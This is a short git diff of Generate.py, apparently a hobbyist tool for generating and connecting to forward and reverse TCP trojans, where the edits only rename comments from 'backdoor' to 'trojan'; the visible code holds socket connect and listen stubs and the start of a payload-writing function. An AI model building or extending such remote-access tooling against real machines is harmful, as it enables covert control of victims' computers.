@@ -1,4 +1,4 @@
-# Generate.py主要是生成和连接后门的作用
+# Generate.py主要是生成和连接木马的作用
 # 作者GitHub:ycy20090311
 
 import socket
@@ -55,7 +55,7 @@ def Win():
     return ret
 """
 
-#连接正向TCP后门
+#连接正向TCP木马
 def connect(ip,port):
     t = socket.socket()
     t.connect((ip,int(port)))
@@ -71,7 +71,7 @@ def connect(ip,port):
     t.close()
 
 
-#接受反向TCP后门的连接
+#接受反向TCP木马的连接
 def listen(ip,port):
     t = socket.socket()
     t.bind((ip,int(port)))
@@ -91,7 +91,7 @@ def listen(ip,port):
     t.close()
 
 
-#生成正反向TCP后门
+#生成正反向TCP木马
 def generate(i,src,ip,port):
     if i == "0":
         f = open(src,"w+")
